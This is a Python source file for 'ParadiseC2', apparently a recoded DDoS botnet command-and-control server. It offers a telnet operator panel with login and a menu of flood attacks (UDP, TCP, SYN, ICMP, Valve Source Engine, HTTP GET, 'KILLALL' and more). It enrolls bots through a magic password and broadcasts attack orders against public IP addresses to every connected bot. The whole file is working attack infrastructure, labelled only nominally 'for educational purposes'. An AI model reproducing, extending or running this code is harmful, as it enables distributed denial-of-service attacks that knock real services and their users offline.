#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#    ___       ___       ___       ___       ___       ___       ___       ___   
#   /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \  
#  /::\  \   /::\  \   /::\  \   /::\  \   /::\  \   _\:\  \   /::\  \   /::\  \ 
# /::\:\__\ /::\:\__\ /::\:\__\ /::\:\__\ /:/\:\__\ /\/::\__\ /\:\:\__\ /::\:\__\
# \/\::/  / \/\::/  / \;:::/  / \/\::/  / \:\/:/  / \::/\/__/ \:\:\/__/ \:\:\/  /
#    \/__/    /:/  /   |:\/__/    /:/  /   \::/  /   \:\__\    \::/  /   \:\/  / 
#             \/__/     \|__|     \/__/     \/__/     \/__/     \/__/     \/__/  

########################
#      ParadiseC2      #
#    Made by wodxgod   #
# Recoded by D3fe4ted  #
# -------------------- #
#  Originally known as #
#       - PYBot -      #
# -------------------- #
# - Added New Methods  #
# - Cleaned up menus   #
# - New look!          #
########################

# Checklist
#make a scanner

# Libraries
import socket, threading, sys, time, ipaddress
from colorama import Fore, init

# Banners
l_banner = """
\x1b[0;38;2;0;255;128m        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[0;38;2;0;248;135m        ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[0;38;2;0;241;142m        ⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣄⠙⣿⣿⣿⣇⣠⣶⣾⣿⣷⣶⣶⠄⠀⠀⠀⠀⠀
\x1b[0;38;2;0;234;149m        ⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀
\x1b[0;38;2;0;227;156m        ⠀⠀⠀⠘⠛⠉⠉⠉⠁⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣀⠀⠀⠀⠀⠀ 
\x1b[0;38;2;0;220;163m        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠿⠛⢿⣿⣿⣿⣿⣟⠛⠻⢿⣷⣦⡀⠀⠀⠀
\x1b[0;38;2;0;213;170m        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠁⠀⠀⢸⣿⣿⡿⠻⣿⣷⡀⠀⠉⠻⢷⠀⠀⠀
\x1b[0;38;2;0;206;177m        ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠁⠀⠀⠀⠸⣿⡿⠁⠀⠈⢿⣇⠀⠀⠀⠀⠀⠀⠀
\x1b[0;38;2;0;199;184m        ⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠏⠀⠀⠀⠀⠀⠀⠀
\x1b[0;38;2;0;192;191m        ⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀                   _ _         
\x1b[0;38;2;0;185;198m        ⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀ ___ ___ ___ ___ _| |_|___ ___ 
\x1b[0;38;2;0;178;205m        ⠀⠀⠀⠀⠀⣼⣿⣿⠃⠀⠀| . | .'|  _| .'| . | |_ -| -_|
\x1b[0;38;2;0;171;212m        ⠀⠀⠀⠀⢠⣿⣿⡟⠀⠀⠀|  _|__,|_| |__,|___|_|___|___|
\x1b[0;38;2;0;164;219m        ⠀⠀⠀⠀⣼⣿⣿⠃⠀⠀⠀|_|                            
\x1b[0;38;2;0;157;226m        ⠀⠀⠀⠀⠈⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0;38;2;0;150;233m                    Username \x1b[0m:\x1b[0;38;2;0;0;0m """

banner = """
\x1b[0;38;2;0;255;128m        ,------.                           ,--.,--.               
\x1b[0;38;2;0;234;149m        |  .--. ' ,--,--.,--.--. ,--,--. ,-|  |`--' ,---.  ,---.  
\x1b[0;38;2;0;213;170m        |  '--' |' ,-.  ||  .--'' ,-.  |' .-. |,--.(  .-' | .-. : 
\x1b[0;38;2;0;192;191m        |  | --' \ '-'  ||  |   \ '-'  |\ `-' ||  |.-'  `)\   --. 
\x1b[0;38;2;0;171;212m        `--'      `--`--'`--'    `--`--' `---' `--'`----'  `----'
\x1b[0;38;2;0;168;209m                         Type "help" for commands.
"""

about = """
\x1b[0;38;2;0;255;128m    ┌────────────────────────────┐
\x1b[0;38;2;0;230;153m    │\x1b[0m * Author : D3fe4ted        \x1b[0;38;2;0;230;153m│
\x1b[0;38;2;0;205;178m    │\x1b[0m * Coded in \x1b[0;38;2;0;102;204mPy\x1b[0;38;2;255;255;0mthon          \x1b[0;38;2;0;205;178m│
\x1b[0;38;2;0;180;203m    │\x1b[0m * For educational purposes \x1b[0;38;2;0;180;203m│
\x1b[0;38;2;0;155;228m    └────────────────────────────┘
"""

help = """
\x1b[0;38;2;0;255;128m    ┌─────────┬───────────────────────────────┐
\x1b[0;38;2;0;237;146m    │\x1b[0m HELP    \x1b[0;38;2;0;237;146m│\x1b[0m Shows list of commands        \x1b[0;38;2;0;237;146m│
\x1b[0;38;2;0;219;164m    │\x1b[0m HOW     \x1b[0;38;2;0;219;164m│\x1b[0m Shows usage of attacks        \x1b[0;38;2;0;219;164m│
\x1b[0;38;2;0;201;182m    │\x1b[0m METHODS \x1b[0;38;2;0;201;182m│\x1b[0m Shows list of attack methods  \x1b[0;38;2;0;201;182m│
\x1b[0;38;2;0;183;200m    │\x1b[0m CLEAR   \x1b[0;38;2;0;183;200m│\x1b[0m Clears the screen             \x1b[0;38;2;0;183;200m│
\x1b[0;38;2;0;165;218m    │\x1b[0m LOGOUT  \x1b[0;38;2;0;165;218m│\x1b[0m Disconnects from the net      \x1b[0;38;2;0;165;218m│
\x1b[0;38;2;0;147;236m    └─────────┴───────────────────────────────┘
"""

how = """
\x1b[0;38;2;0;255;128m    ┌─────────────────────────────┐
\x1b[0;38;2;0;224;159m    │\x1b[0m     How to send attacks     \x1b[0;38;2;0;224;159m│
\x1b[0;38;2;0;193;190m    │\x1b[0m  [IP] [PORT] [TIME] [SIZE]  \x1b[0;38;2;0;193;190m│
\x1b[0;38;2;0;162;221m    └─────────────────────────────┘
"""

methods = """
\x1b[0;38;2;0;255;128m    ┌──────────┬─────────────┬──────────────────────────────────┐
\x1b[0;38;2;0;248;135m    │\x1b[0m   Type   \x1b[0;38;2;0;248;135m│\x1b[0m   Methods   \x1b[0;38;2;0;248;135m│\x1b[0m            Description           \x1b[0;38;2;0;248;135m│
\x1b[0;38;2;0;241;142m    ├──────────┼─────────────┼──────────────────────────────────┤
\x1b[0;38;2;0;234;149m    │\x1b[0m  LAYER3  \x1b[0;38;2;0;234;149m│\x1b[0m * .icmp     \x1b[0;38;2;0;234;149m│\x1b[0m  I.C.M.P Flood                   \x1b[0;38;2;0;234;149m│
\x1b[0;38;2;0;227;156m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;227;156m│\x1b[0m * .udp      \x1b[0;38;2;0;227;156m│\x1b[0m  UDP Junk Flood                  \x1b[0;38;2;0;227;156m│
\x1b[0;38;2;0;220;163m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;220;163m│\x1b[0m * .tcp      \x1b[0;38;2;0;220;163m│\x1b[0m  TCP Junk Flood                  \x1b[0;38;2;0;220;163m│
\x1b[0;38;2;0;213;170m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;213;170m│\x1b[0m * .syn      \x1b[0;38;2;0;213;170m│\x1b[0m  SYNchromize Flood               \x1b[0;38;2;0;213;170m│
\x1b[0;38;2;0;206;177m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;206;177m│\x1b[0m * .tcpsyn   \x1b[0;38;2;0;206;177m│\x1b[0m  TCP/SYN Flood                   \x1b[0;38;2;0;206;177m│
\x1b[0;38;2;0;199;184m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;199;184m│\x1b[0m * .vse      \x1b[0;38;2;0;199;184m│\x1b[0m  Valve Source Engine Flood       \x1b[0;38;2;0;199;184m│
\x1b[0;38;2;0;192;191m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;192;191m│\x1b[0m * .std      \x1b[0;38;2;0;192;191m│\x1b[0m  Standard Internet Flood         \x1b[0;38;2;0;192;191m│
\x1b[0;38;2;0;185;198m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;185;198m│\x1b[0m * .hex      \x1b[0;38;2;0;185;198m│\x1b[0m  Specific HEXIDECIMAL Flood      \x1b[0;38;2;0;185;198m│
\x1b[0;38;2;0;178;205m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;178;205m│\x1b[0m * .cpukill  \x1b[0;38;2;0;178;205m│\x1b[0m  CPUKILL Attack (Ramps up CPU)   \x1b[0;38;2;0;178;205m│
\x1b[0;38;2;0;171;212m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;171;212m│\x1b[0m * .junk     \x1b[0;38;2;0;171;212m│\x1b[0m  JUNK Flood                      \x1b[0;38;2;0;171;212m│
\x1b[0;38;2;0;164;219m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;164;219m│\x1b[0m * .udpmix   \x1b[0;38;2;0;164;219m│\x1b[0m  UDPMIX of TCP and UDP           \x1b[0;38;2;0;164;219m│
\x1b[0;38;2;0;157;226m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;157;226m│\x1b[0m * .killall  \x1b[0;38;2;0;157;226m│\x1b[0m  KILLALL Flood                   \x1b[0;38;2;0;157;226m│
\x1b[0;38;2;0;150;233m    │\x1b[0m  LAYER7  \x1b[0;38;2;0;150;233m│\x1b[0m * .httpget  \x1b[0;38;2;0;150;233m│\x1b[0m  HTTP GET Flood                  \x1b[0;38;2;0;150;233m│
\x1b[0;38;2;0;143;240m    └──────────┴─────────────┴──────────────────────────────────┘
"""

bots = {}
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Check if all bots are still connected to C2
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Updates Shell Title
def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;ParadiseC2 | Boats: {len(bots)} | User: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

# Telnet Command Line
def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'\x1b[0m[\x1b[32m~\x1b[0m] \x1b[0;38;2;0;128;255mParadise \x1b[0m$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'ABOUT':
                send(client, about)
            if command == 'HELP':
                send(client, help)
            if command == 'HOW':
                send(client, how)
            elif command == 'METHODS':
                send(client, methods)
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)
            elif command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)
            elif command == 'LOGOUT':
                send(client, '\x1b[0m[\x1b[31m-\x1b[0m] \x1b[32mSuccessfully \x1b[0mLogged out\n')
                time.sleep(1)
                break
            elif command == 'EXIT':
                send(client, '\x1b[0m[\x1b[31m-\x1b[0m] \x1b[32mSuccessfully \x1b[0mLogged out\n')
                time.sleep(1)
                break
            elif command == '.UDP': # UDP Junk (Random UDP Data)
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.TCP': # TCP Junk (Random TCP Data)
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')
            elif command == '.SYN': # SYN flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.TCPSYN': # TCP/SYN Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcpsyn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.VSE': # Valve Source Engine Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')
            elif command == '.STD': # Standard Internet Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .std [IP] [PORT] [TIME]')
            elif command == '.ICMP': # Internet Control Message Protocol Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .icmp [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .hex [IP] [PORT] [TIME]')
            elif command == '.CPUKILL': # CPUKILL Attack (Ramps up CPU)
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .cpukill [IP] [PORT] [TIME]')
            elif command == '.JUNK': # JUNK Flood
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .junk [IP] [PORT] [TIME]')
            elif command == '.UDPMIX': # UDPMIX of TCP and UDP
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udpmix [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.KILLALL': # KILLALL Flood (Kills most connections)
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .killall [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.HTTPGET': # HTTP GET Flood
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

# Username Login
def handle_client(client, address):
    send(client, f'\33]0;ParadiseC2 | Login: Awaiting Response...\a', False)
    while 1:
        send(client, ansi_clear, False)
        send(client, l_banner, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\x1b[0;38;2;0;150;233m                    Password \x1b[0m:\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + '\x1b[0m[\x1b[31m-\x1b[0m] Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Screening and Broadcasting (Via Telnet)
screenedSuccessfully = """\x1b[0m
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
  
"""

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('\x1b[0m[\x1b[31m-\x1b[0m] Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('\x1b[0m[\x1b[31m-\x1b[0m] Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()